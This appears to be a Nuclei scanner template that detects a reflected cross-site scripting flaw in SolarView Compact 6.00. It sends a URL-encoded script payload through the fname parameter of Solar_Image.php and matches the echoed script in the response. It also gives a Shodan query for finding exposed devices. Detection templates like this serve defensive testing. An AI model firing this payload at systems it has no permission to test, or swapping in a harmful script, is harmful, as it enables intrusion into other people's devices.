http:
- matchers:
  - part: body
    type: word
    words:
    - value="test"><script>alert(document.domain)</script>">
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: solarview-compact-xss
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: 'SolarView Compact 6.00 contains a cross-site scripting vulnerability
    via fname at /Solar_Image.php.

    '
  metadata:
    max-request: 1
    shodan-query: http.html:"SolarView Compact"
    verified: true
  name: SolarView Compact 6.00 - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/50968
  severity: high
  tags: xss,solarview,edb
